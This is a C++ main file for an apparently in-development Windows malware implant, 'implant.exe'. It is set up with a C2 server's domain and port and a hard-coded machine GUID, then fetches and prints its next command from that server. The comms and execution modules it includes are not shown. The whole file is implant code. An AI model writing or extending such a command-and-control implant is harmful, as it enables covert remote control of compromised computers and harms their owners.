#include <iostream>
#include <string>
#include <windows.h>
#include <winhttp.h>
#include "../comms/comms.hpp"
#include "../execution/execution.hpp"
#include "../config/config.hpp"


int main(int argc, char *argv[]) {
    CONFIG config;

    if (argc != 3) {
        std::cout
            << "usage: implant.exe fqdn(no http://) port"
            << std::endl;
        return 0;
    }

    config.computer_guid = std::string("dd848dea-b850-46a3-bfa2-44748cb90aed"); // TODO: get guid properly
    config.c2_fqdn = std::string(argv[1]);
    config.c2_port = std::stoi(argv[2]);

    // [[testing getCommand]]
    std::string nextCommand;
    nextCommand = getNextCommand(config);
    std::cout << "got command: " << nextCommand << std::endl;

    return 0;
}
